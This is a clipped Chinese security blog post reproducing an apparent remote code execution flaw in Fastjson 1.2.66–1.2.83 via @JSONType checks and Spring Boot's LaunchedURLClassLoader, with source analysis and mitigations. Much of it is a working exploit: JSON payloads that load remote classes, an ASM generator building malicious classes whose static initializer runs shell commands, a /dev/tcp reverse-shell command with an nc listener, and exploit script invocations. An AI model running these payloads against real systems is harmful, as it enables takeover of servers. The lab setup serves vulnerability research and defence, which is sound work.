---
title: 【先知】Fastjson 1.2.83 RCE全版本复现（本人两台真实环境）
source: https://xz.aliyun.com/news/92583
source_host: xz.aliyun.com
clip_date: 2026-07-29T00:39:27+08:00
trace_id: 2e8476d0-7d45-4cd0-9a2d-b111af692e9b
content_hash: a9479eabb7a6538ab4fcb99e9570c0aef98237efc0e5427211f94c3e3ec999fa
status: synced
tags:
  - 先知
  - 漏洞分析
  - Java安全
series: null
feed_source: null
ai_summary: Fastjson 1.2.66~1.2.83版本存在一个无需开启AutoType即可利用的远程代码执行漏洞，根本原因是其信任逻辑倒置，将攻击者可控的@JSONType注解作为安全放行的依据。
ai_summary_style: key-points
images_status:
  total: 28
  succeeded: 28
  failed_urls: []
notion_page_id: 3ab75244-d011-8135-a1a9-cf0080f27eca
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> Fastjson 1.2.66~1.2.83版本存在一个无需开启AutoType即可利用的远程代码执行漏洞，根本原因是其信任逻辑倒置，将攻击者可控的@JSONType注解作为安全放行的依据。
> 
> - **漏洞根因：** Fastjson的`checkAutoType`方法在关闭AutoType时，仍会通过`ClassLoader.getResourceAsStream`加载攻击者在`@type`中指定的远程资源，并仅凭资源包中的`@JSONType`注解就判定为可信，进而执行类初始化`<clinit>`，导致RCE。
> - **利用前提：** 目标应用需依赖特定版本的Fastjson，并且其默认ClassLoader为Spring Boot的`LaunchedURLClassLoader`，该加载器支持`jar:http://`等协议，使得远程加载恶意类成为可能。
> - **攻击模式：** JDK 8环境下可使用`jdk8-http`短链模式直接加载远程`.class`文件；JDK 17及以上版本由于内部API限制，需采用`fd`模式，先通过HTTP拉取JAR包，再枚举`/proc/self/fd/`下的文件描述符进行二次加载。
> - **修复方案：** 可通过配置`-Dfastjson.parser.safeMode=true`启用安全模式，或升级Fastjson至1.2.84及以上版本，也可在网络层面拦截包含`jar:http`特征的恶意请求。

> **声明：**
> 
> 1、本文使用本人的真机仅进行复现且已打码
> 
> 2、复现所需文件已大包上传： [https://github.com/Ameng052/Fastjson1.2.83_RCE_Full_Version](https://github.com/Ameng052/Fastjson1.2.83_RCE_Full_Version)
> 
> 3、本文（含所有代码、命令、操作步骤及技术描述）仅供网络安全研究、教学、授权渗透测试及防御加固使用。

## 漏洞说明

`fastjson 1.2.66 ~ 1.2.83` 版本存在远程代码执行漏洞。攻击者可通过构造特定 `JSON数据` ，利用 `@JSONType` 注解探测路径漏洞绕过 `checkAutoType` 安全检查，配合 `Spring Boot` 的 `LaunchedURLClassLoader` 会远程加载恶意类并执行 `<clinit>` 完成 RCE。该漏洞无需启用 AutoType 即可利用，影响所有使用受影响版本且未开启 SafeMode 的应用。

漏洞发现作者：

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/d95ee632dc044a84.png)

## 受影响版本与利用条件

|     |     |
| --- | --- | 
| **项目** | **详情** |
| 受影响版本 | fastjson 1.2.66 ~ 1.2.83 |
| 不受影响版本 | fastjson ≤ 1.2.65、fastjson ≥ 1.2.84、fastjson2 全版本 |
| CVSS 3.1 | 9.8 (Critical) |
| 利用前提 | JDK + Spring Boot FatJar |
| SafeMode | 开启后可阻断此漏洞 |

## 漏洞分析

## 漏洞本质

## 源码分析

### checkAutoType()入口

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5d847820ca2ae782.png)

### SafeMode判断

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/214a71bf07401172.png)

### 计算autoTypeSupport

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8b31a781f467a295.png)

### 白名单、黑名单、缓存判断

4个硬编码白名单

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f7d38dae41911196.png)

点击跳转

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/19b9fa45116754ba.png)

### 根本缺陷1：读取攻击者指定的.class 资源

1.  把 @type 的值直接当成资源名： `typeName.replace('.', '/') + ".class"` 。
2.  通过 `defaultClassLoader.getResourceAsStream(...)` 去加载这个资源。
3.  如果 `ClassLoader` 是 `**Spring Boot**` **的** `**LaunchedURLClassLoader**` （几乎所有 Fat JAR 都会用），它支持 `jar:http://` 、 `jar:file:`、 `jar:file:/proc/self/fd/N` 等特殊 URL 协议。
4.  攻击者只要让 `typeName` 变成类似 `jar:http://attacker:port/xxx!/` 恶意类名 的形式，就会触发 **远程 JAR 拉取** 。
5.  拉取到的字节码被 `ClassReader + TypeCollector` 扫描，判断是否带有 `@JSONType` 注解。
6.  只要扫描结果 `jsonType == true` ，就会进入后续真正的类加载。

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7a16f890f69f85aa.png)

### 根本缺陷2：发现@JSONType后加载类

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/21f2ef356a3e0d84.png)

在 AutoType 关闭时：

```java
autoTypeSupport == false
```

但只要远程 class 文件带有 `@JSONType` ：

```java
jsonType == true
```

条件仍然成立：

```java
false || true || false == true
```

于是 Fastjson 会调用：

```java
TypeUtils.loadClass(...)
```

这形成了一个严重的信任逻辑倒置。

正常安全逻辑应当是：

```latex
先判断类型来源是否可信
        ↓
可信后才允许读取或加载字节码
```

Fastjson 1.2.83 的实际逻辑却是：

```latex
先读取攻击者指定的 class 字节码
        ↓
检查攻击者字节码是否声明 @JSONType
        ↓
攻击者字节码声明自己带有 @JSONType
        ↓
Fastjson 据此认为可以继续加载该类
```

也就是说：

> 攻击者既控制待验证对象，也控制用于通过验证的“可信标志”。

`@JSONType` 本来只是一个功能性注解，却被错误地承担了安全授权作用。

### 绕过AutoType关闭状态

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/fdc749f5327d1690.png)

**绕过原理** ：

1.  `autoTypeSupport` 默认是 `false` （系统属性 fastjson.parser.autoTypeSupport 未设为 true）。
2.  即使 `autoTypeSupport == false` ，只要探测阶段返回 `jsonType == true` （即目标资源带有 `@JSONType` 注解），条件 `autoTypeSupport || jsonType || expectClassFlag` 就会成立。
3.  随后直接调用 `TypeUtils.loadClass(...)` ，进入真正的类加载与初始化。

**因此** ：关闭 `AutoType` **并不能** 阻止带 `@JSONType` 注解的类被加载。 这是漏洞能够在“类型绑定 + AutoType 关闭”场景下成立的根本原因。

### 防护检查，但发生得过晚

源码中存在多层防护

|     |     |     |     |
| --- | --- | --- | --- |   
| 检查点 | 代码位置 | 发生时机 | 问题  |
| **safeMode** | 方法最前面 | 最早  | 默认关闭。一旦开启可直接阻断，但绝大多数环境未开启 |
| **长度限制** | `typeName.length() >= 192 \| < 3` | 较早  | 只拦超长/过短字符串，对正常长度的 `jar:...`<br><br>无效 |
| **hash 黑名单** （denyHashCodes / internalDenyHashCodes） | 中前段 | 中等  | 主要针对普通类名哈希，对 `jar:http://`<br><br>、 `jar:file:/proc/self/fd/N`<br><br>这类特殊字符串匹配困难 |
| **白名单** （acceptHashCodes） | 同上  | 中等  | 仅加速放行，不构成拦截 |
| **@JSONType 探测后的 loadClass** | 后半段 | **过晚** | 此时资源已经通过 ClassLoader 拉取，恶意类可能已经执行了静态初始化块 |
| **最后的** `**!autoTypeSupport**`<br><br>**抛异常** | 方法末尾 | **最晚** | 恶意代码已在前面的 `loadClass`<br><br>阶段执行完毕 |

```java
if (!autoTypeSupport) {
    if (typeName.endsWith("Exception") || typeName.endsWith("Error")) {
        return null;
    }
    throw new JSONException("autoType is not support. " + typeName);
}
```

-   真正危险的动作（ `getResourceAsStream` → 远程/FD 资源拉取 → `ClassReader` 扫描 → `loadClass` ）发生在黑名单/白名单检查之后、最终`!autoTypeSupport` 抛异常之前。
-   一旦 `jsonType == true` ，就会进入 `TypeUtils.loadClass` ，此时类初始化（ `<clinit>` ）已经可能完成。
-   后续的 `ClassCastException` （在类型绑定场景下）只是“事后”现象，无法阻止已执行的代码。

### FD组合链的关键条件

```java
boolean jsonType = false;
InputStream is = null;
try {
    String resource = typeName.replace('.', '/') + ".class";   // ← 关键转换
    if (defaultClassLoader != null) {
        is = defaultClassLoader.getResourceAsStream(resource); // ← 真正触发点
    } else {
        is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
    }
    if (is != null) {
        ClassReader classReader = new ClassReader(is, true);
        TypeCollector visitor = new TypeCollector("<clinit>", new Class[0]);
        classReader.accept(visitor);
        jsonType = visitor.hasJsonType();                      // 判断是否带 @JSONType
    }
} catch (Exception e) {
    // skip
} finally {
    IOUtils.close(is);
}
```

1.  当 `typeName` 为 `jar:file:/proc/self/fd/123!/com/example/Poc` 这类字符串时， `replace('.', '/')` 后变成资源路径。
2.  `defaultClassLoader.getResourceAsStream(...)` 会把这个路径交给当前 `ClassLoader` （必须是 LaunchedURLClassLoader）。
3.  Spring Boot 的 `LaunchedURLClassLoader` + 已注册的 `jar:`协议处理器，能够识别 `/proc/self/fd/N` 并打开对应的已保留文件描述符。

## 两种利用手法

## JDK8 HTTP 短链模式：

```plain
{"@type":"http:..2130706433:8080.At1784827126_jdk8_http"}
```

其中 `2130706433` 是 `127.0.0.1` 的⼗进制整数表示（⽤于绕过点号替换逻辑）。

payload识别后会直接拉取我们构造好的恶意 `class` 文件并加载，JDK8 的 `LaunchedURLClassLoader` 支持 HTTP resource。

## FD 枚举模式（JDK17/21/25）：

```json
[
  {"@type": "jar:http:..2130706433:8080.probe_t1784975521_fd!.foo.Tt1784975521_fdException"}, 
  {"@type": "jar:file:.proc.self.fd.3!.fd3.Tt1784975521_fdException"}, 
  {"@type": "jar:file:.proc.self.fd.4!.fd4.Tt1784975521_fdException"}, 
  ... (255 item(s))
]
```

先通过 HTTP 下载 JAR，再通过 `/proc/self/fd/` 枚举引用已下载的 JAR。

## 对应使用模式

|     |     |     |
| --- | --- | --- |  
| **模式** | **适用 JDK** | **过程** |
| `jdk8-http` | JDK 8 | 直接拉取 class 并加载执行 |
| `fd` | JDK 17/21/25 | 先拉取 JAR 恶意类，再枚举 `/proc/self/fd/N` 加载 |

## JDK 8 复现（jdk8-http 模式）

## 靶机

### 部署命令

```bash
# docker环境一键部署
curl -fsSL https://get.docker.com | sh

cd Fastjson1.2.83_RCE_Full_Version/target/jdk8
docker build -t fastjson-target .
docker run -d --name fastjson-target  -p 8080:8080  fastjson-target
```

### 文件分析

```bash
jdk8/
├── Dockerfile
└── src/
    └── VulnApp.java
```

-   **基础镜像** ：eclipse-temurin:8-jdk（明确锁定 JDK 8）。
-   **依赖** ：

-   fastjson-1.2.83.jar（存在漏洞的版本）
-   spring-boot-loader-2.7.18.jar（提供 `LaunchedURLClassLoader` 和 `JarFile` 协议处理器）

-   **编译** ：使用 `-XDignore.symbol.file` 绕过部分内部 API 限制，classpath 包含上述两个 JAR。
-   **运行** ： `classpath` 包含 `lib` 和 `classes` ，通过系统属性传入端口和 `fastjson` 路径。

### 靶机环境详解

```java
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.sun.net.httpserver.HttpServer;

import java.io.*;
import java.net.*;

/**
 * 【漏洞本质】
 * 即使满足以下“看似安全”的条件，仍然可以触发远程代码执行（RCE）：
 *   1. autoType 完全关闭（默认就是关闭的）
 *   2. 使用类型绑定解析：JSON.parseObject(body, Dto.class)
 *   3. 目标类（Dto）本身完全无害，没有任何危险方法
 *
 * 关键触发条件只有一个：
 *   fastjson 的默认 ClassLoader 被设置成了 Spring Boot 的
 *   LaunchedURLClassLoader（几乎所有 Spring Boot Fat JAR 都会使用它）。
 */
public class VulnApp {

    /**
     * 极简 DTO，故意设计成完全无害。
     * 只有一个普通的 int 字段，没有任何 getter/setter 副作用，
     * 也没有任何危险的构造函数或静态初始化块。
     * 用来证明：漏洞不依赖目标类本身有危险方法。
     */
    public static class Dto {
        public int x;

        public int getX() {
            return x;
        }

        public void setX(int v) {
            x = v;
        }
    }

    public static void main(String[] args) throws Exception {
        // 监听端口，可通过 -Dapp.port=xxxx 覆盖，默认 8080
        int port = Integer.getInteger("app.port", 8080);

        // fastjson JAR 的本地路径，可通过 -Dapp.fastjsonJar=xxx 覆盖
        // 在 Docker 环境中默认是 /app/lib/fastjson.jar
        File fjjar = new File(System.getProperty("app.fastjsonJar", "/app/lib/fastjson.jar"));

        // ----------------------------------------------------------------------
        // 【核心漏洞条件复现】强制把 fastjson 的默认 ClassLoader 换成
        // Spring Boot 的 LaunchedURLClassLoader
        // ----------------------------------------------------------------------
        //
        // 1. 注册 Spring Boot 对 jar: 协议的特殊处理（JarFile）
        //    真实 Spring Boot Fat JAR 启动时会自动做这件事。
        org.springframework.boot.loader.jar.JarFile.registerUrlProtocolHandler();

        // 2. 构造 LaunchedURLClassLoader 的 URL 列表：
        //    - 第一个 URL 指向 fastjson 自身的 JAR（模拟 Fat JAR 内嵌依赖）
        //    - 第二个 URL 指向本地编译出来的 classes 目录
        URL[] urls = {
            new URL("jar:" + fjjar.toURI().toURL() + "!/"),
            new File("/app/classes").toURI().toURL()
        };

        // 3. 创建 LaunchedURLClassLoader
        //    父加载器使用系统 ClassLoader 的 parent（模拟真实 Spring Boot 的隔离层级）
        ClassLoader fatCL = new org.springframework.boot.loader.LaunchedURLClassLoader(
            urls,
            ClassLoader.getSystemClassLoader().getParent()
        );

        // 4. 把这个 ClassLoader 设置为 fastjson 全局默认 ClassLoader
        //    这是整个漏洞成立的最关键一步！
        //    之后 fastjson 在 checkAutoType 时调用 getResourceAsStream()，
        //    就会走 LaunchedURLClassLoader 的特殊逻辑，从而支持
        //    jar:http://... 形式的远程资源加载。
        ParserConfig.getGlobalInstance().setDefaultClassLoader(fatCL);

        // ----------------------------------------------------------------------
        // 启动一个最简 HTTP 服务（使用 JDK 内置 HttpServer，无额外依赖）
        // ----------------------------------------------------------------------
        HttpServer server = HttpServer.create(new InetSocketAddress("0.0.0.0", port), 0);

        server.createContext("/", ex -> {
            String resp;

            // 只处理 /parse 路径，其余路径返回状态信息
            if ("/parse".equals(ex.getRequestURI().getPath())) {
                // 读取完整 POST body
                String body = new String(readAll(ex.getRequestBody()), "UTF-8");

                // 打印请求内容，方便实验时观察
                System.out.println("[target] parseObject(body, Dto.class)  body=" + body);

                try {
                    // ============================================================
                    // 【漏洞触发点 / Sink】
                    // ============================================================
                    // 这里使用了“类型绑定解析”：
                    //   JSON.parseObject(body, Dto.class)
                    //
                    // 很多人误以为：
                    //   - autoType 已关闭
                    //   - 指定了具体目标类型 Dto.class
                    //   → 一定安全
                    //
                    // 实际上，在 LaunchedURLClassLoader 环境下，
                    // fastjson 内部 checkAutoType 仍然会尝试通过
                    // ClassLoader.getResourceAsStream() 去探测 @type 对应的资源，
                    // 从而触发远程类加载。
                    // ============================================================
                    Dto d = JSON.parseObject(body, Dto.class);   // <-- 真正的漏洞触发点

                    // 解析成功则返回正常结果
                    resp = "{\"ok\":true,\"x\":" + d.x + "}";
                } catch (Throwable t) {
                    // 捕获所有异常（包括类加载失败、恶意类执行过程中的异常等）
                    // 只返回简单的错误类名，避免泄露堆栈
                    resp = "{\"ok\":false,\"error\":\"" + t.getClass().getSimpleName() + "\"}";
                }
            } else {
                // 根路径返回当前运行状态，方便确认环境是否正确
                resp = "fastjson @JSONType RCE lab target. POST JSON to /parse "
                     + "(bound to Dto.class, autoType OFF). fastjson=" + JSON.VERSION
                     + " classloader=" + ParserConfig.getGlobalInstance().getDefaultClassLoader().getClass().getName();
            }

            // 统一返回 JSON 响应
            byte[] rb = resp.getBytes("UTF-8");
            ex.getResponseHeaders().set("Content-Type", "application/json");
            ex.sendResponseHeaders(200, rb.length);
            ex.getResponseBody().write(rb);
            ex.close();
        });

        server.setExecutor(null);   // 使用默认单线程执行器即可
        server.start();

        // 启动成功后打印关键环境信息，方便确认漏洞条件是否满足
        System.out.println("[target] listening :" + port
                + "  fastjson=" + JSON.VERSION
                + "  autoType=" + ParserConfig.getGlobalInstance().isAutoTypeSupport()
                + "  classloader=" + fatCL.getClass().getName());
    }

    /**
     * 工具方法：完整读取 InputStream 到 byte[]
     * （因为 HttpServer 的 RequestBody 需要手动读完）
     */
    static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream o = new ByteArrayOutputStream();
        byte[] b = new byte[4096];
        int n;
        while ((n = in.read(b)) > 0) {
            o.write(b, 0, n);
        }
        return o.toByteArray();
    }
}
```

## 攻击机

```bash
chmod +x ./RCE/scripts/http-test.sh
CMD='/bin/sh -i >& /dev/tcp/攻击机ip/2333 0>&1' ./RCE/scripts/http-test.sh <攻击端IP> <攻击端HTTP端口> <目标URL> [接口路径]

#开启监听
nc -lvnp 2333
```

### 脚本一键攻击

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/c51b378457a6189c.png)

### 成功反弹shell

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/834135d20dce6853.png)

### 靶机docker日志

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f028508cbb22b782.png)

### 恶意类编写详解

```java
import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

/**
 * ================================================================================
 *  恶意 probe / class 生成器（Fastjson 1.2.83 @JSONType 远程类加载）
 * ================================================================================
 *
 * 【核心原理】
 * Fastjson 的 checkAutoType 在 autoType 关闭时，仍会执行以下探测：
 *
 *   String resource = typeName.replace('.', '/') + ".class";
 *   InputStream is = defaultClassLoader.getResourceAsStream(resource);
 *
 * 当 defaultClassLoader 是 Spring Boot 的 LaunchedURLClassLoader 时，
 * typeName 可以被构造成特殊的 jar: / http: URL，从而触发远程资源加载。
 *
 * 本工具生成两种模式的恶意文件：
 *   1. jdk8-http ：生成单个 .class，用于 JDK 8 短路径（直接 defineClass）
 *   2. fd        ：生成 probe.jar（内含多个带 @JSONType 的类），用于
 *                  JDK 9+ 的 /proc/self/fd 二次加载链
 *
 * 【payload 形态示例】
 *   jdk8-http:
 *     {"@type":"http:..INT_IP:PORT.a"}
 *
 *   fd:
 *     {"value":[
 *       {"@type":"jar:http:..INT_IP:PORT.probe!.foo.Exception"},
 *       {"@type":"jar:file:.proc.self.fd.3!.fd3.Exception"},
 *       ...
 *     ]}
 */
public class GenProbe {

    /** FD 扫描范围：从 3 开始（0/1/2 通常是 stdin/stdout/stderr）到 256 */
    private static final int MIN_FD = 3;
    private static final int MAX_FD = 256;

    /**
     * 清理并校验 tag，只允许字母、数字、下划线。
     * tag 用于生成唯一的类名/文件名，避免多次实验时类缓存冲突。
     */
    private static String cleanTag(String tag) {
        if (tag == null || tag.isEmpty()) {
            return "";
        }
        if (!tag.matches("[A-Za-z0-9_]+")) {
            throw new IllegalArgumentException("tag must match [A-Za-z0-9_]+");
        }
        return tag;
    }

    /**
     * 把点分十进制 IP 转成无符号 32 位整数（字符串形式）。
     *
     * 原因：payload 中的 typeName 经过 replace('.', '/') 后，
     * 普通 IP（如 8.128.101.156）会变成 8/128/101/156，路径被破坏。
     * 转成整数后变成 "142632348"，replace 不会引入斜杠，ClassLoader
     * 仍能正确解析为 IP 地址。
     */
    private static String toPayloadHost(String host) {
        if (host.matches("\\d+\\.\\d+\\.\\d+\\.\\d+")) {
            String[] parts = host.split("\\.");
            long ipInt = (Long.parseLong(parts[0]) << 24)
                       | (Long.parseLong(parts[1]) << 16)
                       | (Long.parseLong(parts[2]) << 8)
                       | Long.parseLong(parts[3]);
            return String.valueOf(ipInt);
        }
        // 非 IP（域名等）直接返回原值
        return host;
    }

    /**
     * 使用 ASM 动态生成一个恶意 Java 类的字节码。
     *
     * @param internalName  类的内部名（ASM 使用 / 分隔，可包含特殊字符以匹配 URL）
     * @param cmd           要在静态初始化块中执行的系统命令
     * @param jsonType      是否添加 @JSONType 注解（探测阶段需要此注解才会放行 loadClass）
     * @param execCommand   是否生成真正执行命令的 <clinit>
     * @return              完整的 .class 字节数组
     */
    private static byte[] makeClass(String internalName, String cmd,
                                    boolean jsonType, boolean execCommand) {
        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);

        // 生成一个 public 类，继承 Object，目标版本 Java 8
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName,
                 null, "java/lang/Object", null);

        // ---------- 关键：添加 @JSONType 注解 ----------
        // Fastjson 的 TypeCollector 会扫描这个注解。
        // 只有带有 @JSONType 的类，才会在 autoType=false 时被允许 loadClass。
        if (jsonType) {
            AnnotationVisitor av = cw.visitAnnotation(
                    "Lcom/alibaba/fastjson/annotation/JSONType;", true);
            // asm=false 只是填充一个属性，实际值不重要
            av.visit("asm", Boolean.FALSE);
            av.visitEnd();
        }

        // ---------- 普通无参构造方法 ----------
        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(1, 1);
        init.visitEnd();

        // ---------- 静态初始化块 <clinit> ----------
        // 类被 defineClass 并初始化时自动执行，是 RCE 的实际触发点。
        if (execCommand) {
            MethodVisitor clinit = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
            clinit.visitCode();

            // Runtime.getRuntime()
            clinit.visitMethodInsn(Opcodes.INVOKESTATIC,
                    "java/lang/Runtime", "getRuntime",
                    "()Ljava/lang/Runtime;", false);

            // 构造 String[]{"/bin/bash", "-c", cmd}
            clinit.visitInsn(Opcodes.ICONST_3);
            clinit.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");

            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_0);
            clinit.visitLdcInsn("/bin/bash");
            clinit.visitInsn(Opcodes.AASTORE);

            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_1);
            clinit.visitLdcInsn("-c");
            clinit.visitInsn(Opcodes.AASTORE);

            clinit.visitInsn(Opcodes.DUP);
            clinit.visitInsn(Opcodes.ICONST_2);
            clinit.visitLdcInsn(cmd);          // 用户指定的命令
            clinit.visitInsn(Opcodes.AASTORE);

            // Runtime.exec(String[])
            clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "java/lang/Runtime", "exec",
                    "([Ljava/lang/String;)Ljava/lang/Process;", false);

            clinit.visitInsn(Opcodes.POP);    // 丢弃 Process 返回值
            clinit.visitInsn(Opcodes.RETURN);
            clinit.visitMaxs(5, 0);
            clinit.visitEnd();
        }

        cw.visitEnd();
        return cw.toByteArray();
    }

    public static void main(String[] args) throws Exception {
        // ---------- 参数解析 ----------
        String lhost = args.length > 0 ? args[0] : "127.0.0.1";   // 攻击机地址
        String lport = args.length > 1 ? args[1] : "19090";       // 攻击机端口
        String cmd   = args.length > 2 ? args[2] : "open -a Calculator"; // 要执行的命令
        String mode  = args.length > 3 ? args[3] : "fd";          // jdk8-http 或 fd
        String tag   = cleanTag(args.length > 4 ? args[4] : "");  // 唯一标识，避免缓存冲突

        String payloadHost = toPayloadHost(lhost);  // IP → 整数，防止 replace 破坏
        String classSuffix = tag.isEmpty() ? "" : tag;

        Files.createDirectories(Paths.get("poc/www"));

        // ====================================================================
        // 模式 1：jdk8-http（JDK 8 短路径）
        // ====================================================================
        // 直接生成一个带 @JSONType + <clinit> 的 .class 文件。
        // payload 形态：{"@type":"http:..INT_IP:PORT.类名"}
        // LaunchedURLClassLoader 会把整个 "http://..." 当作类名去加载，
        // 在 JDK 8 上可以成功 defineClass 并执行静态块。
        if ("jdk8-http".equals(mode)) {
            Files.deleteIfExists(Paths.get("poc/www/probe"));

            // 类名：无 tag 时用 "a"，有 tag 时用 "A" + tag
            String className = tag.isEmpty() ? "a" : "A" + classSuffix;

            // internalName 故意写成完整 URL 形态，匹配 ClassLoader 解析后的名字
            String internal = "http://" + payloadHost + ":" + lport + "/" + className;

            Files.write(Paths.get("poc/www/" + className + ".class"),
                        makeClass(internal, cmd, true, true));   // jsonType=true, exec=true

            System.out.println("[+] poc/www/" + className + ".class generated");
            System.out.println("[+] JDK8 HTTP payload: {\"@type\":\"http:.."
                    + payloadHost + ":" + lport + "." + className + "\"}");
            return;
        }

        // ====================================================================
        // 模式 2：fd（JDK 9+ /proc/self/fd 组合链）
        // ====================================================================
        // 生成一个 JAR，里面包含：
        //   1. 一个「种子」类（不执行命令，只为了让 ClassLoader 打开远程 JAR 并留下 FD）
        //   2. 多个真正的恶意类（带 @JSONType + <clinit>），路径设计为
        //      对应 /proc/self/fd/N 下的不同描述符
        //
        // 攻击流程：
        //   第一次 @type 用 jar:http://... 拉取整个 JAR → 留下打开的 FD
        //   后续 @type 用 jar:file:/proc/self/fd/N!/... 重新打开该 FD
        //   加载其中带 @JSONType 的类 → 执行 <clinit>
        Path jarPath = Paths.get("poc/probe.jar");
        String probeName  = tag.isEmpty() ? "probe" : "probe_" + classSuffix;
        String firstClass = tag.isEmpty() ? "Exception" : "T" + classSuffix + "Exception";
        String fdClass    = tag.isEmpty() ? "Exception" : "T" + classSuffix + "Exception";

        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath.toFile()))) {

            // ----- 种子类（第一次探测用，不执行命令）-----
            // 路径：foo/Exception.class
            // 内部名故意写成完整 jar:http URL，方便后续匹配
            String firstInternal = "jar:http://" + payloadHost + ":" + lport
                                 + "/" + probeName + "!/foo/" + firstClass;
            jos.putNextEntry(new JarEntry("foo/" + firstClass + ".class"));
            // jsonType=false, execCommand=false → 只负责打开 JAR，不触发命令
            jos.write(makeClass(firstInternal, cmd, false, false));
            jos.closeEntry();

            // ----- 真正的恶意类（对应每个可能的 FD 编号）-----
            for (int fd = MIN_FD; fd <= MAX_FD; fd++) {
                // JAR 内部路径：fd3/Exception.class、fd4/Exception.class ...
                String entry = "fd" + fd + "/" + fdClass + ".class";

                // 内部名写成 jar:file:/proc/self/fd/N!/... 形态
                // 当 ClassLoader 用这个名字去 loadClass 时，会重新打开对应的 FD
                String internal = "jar:file:/proc/self/fd/" + fd
                                + "!/fd" + fd + "/" + fdClass;

                jos.putNextEntry(new JarEntry(entry));
                // jsonType=true + execCommand=true → 带注解且执行命令
                jos.write(makeClass(internal, cmd, true, true));
                jos.closeEntry();
            }
        }

        // 把生成的 JAR 复制到 www 目录，供 HTTP 服务直接下载
        // 注意：文件名是 probeName（无后缀），匹配 payload 中的资源名
        Files.copy(jarPath, Paths.get("poc/www/" + probeName),
                   StandardCopyOption.REPLACE_EXISTING);

        System.out.println("[+] poc/probe.jar & poc/www/" + probeName + " generated");
        System.out.println("[+] First stage: {\"@type\":\"jar:http:.."
                + payloadHost + ":" + lport + "." + probeName
                + "!.foo." + firstClass + "\"}");
        System.out.println("[+] FD stages: jar:file:.proc.self.fd.3!.fd3." + fdClass
                + " ... jar:file:.proc.self.fd." + MAX_FD
                + "!.fd" + MAX_FD + "." + fdClass);
    }
}
```

### ☆☆☆手动攻击

**注意踩坑：类只会被定义和初始化一次，第二次攻击只是缓存命中，JVM 不会重复执行静态代码，重启靶机即可恢复可重复利用的状态。**

1.  **靶机docker重启**
2.  **攻击机开启http服务**

```java
python3 ./poc/exploit.py 攻击机ip 8080 http://靶机ip:8080 --serve-only --mode jdk8-http
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/8654e05ecfe6501c.png)

3.  **使用自动化脚本生成的payload：**

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/f0f30d2f53d02556.png)

4.  成功反弹shell

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/25d27db3165dae6a.png)

## JDK 17 复现（fd 模式）

## 靶场

```bash
cd ./Fastjson1.2.83_RCE_Full_Version/target/jdk17
docker build -t modern-fd-target .
docker run -d --name fd-target -p 8080:8080 modern-fd-target
```

### 靶机docker日志

```bash
docker logs -f 5beb0
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/5ea3ac04882be4c6.png)

## 攻击机

```bash
# 使用脚本生成恶意jar包
CMD='/bin/sh -i >& /dev/tcp/攻击机ip/2333 0>&1' scripts/http-test.sh 攻击机ip 8080 http://攻击机ip:8080/ /parse

# 查看生成的恶意jar包名
ls ./RCE/poc/www/
# At1784975521_jdk8_http.class  probe_t1784975521_fd
python3 ./RCE/poc/exploit_fd.py 攻击机ip 8080 http://靶机ip:8080 /parse --mode fd --tag t1784975521_fd
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/7ef55b4c7cd56390.png)

### 成功反弹shell

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/4fcce364dc995aa1.png)

### ☆☆☆手动攻击

1.  重启靶机
2.  使用自动化脚本生成的payload的，恶意类生成在`./RCE/poc/www/` 目录下
3.  发包让靶机下载恶意类

注：返回包设置过，会直接回显下载位置

或者使用批量爆破： `{"@type": "jar:file:.proc.self.fd.{{int::fd(3-256)}}!.fd{{int::fd(3-256)}}.Tt1784975521_fdException"}`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/96c006e782898e7a.png)

4.  直接访问加载触发恶意类

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/30d6dbbabafecfc7.png)

5.  成功触发反弹shell

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/44a442c1c5dac4a4.png)

6.  查看docker日志

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/07/cd6945d80e5a9b45.png)

### 靶机环境详解

位置： `Fastjson1.2.83_RCE_Full_Version/target/jdk17/src/main/java/lab/modernfd/`

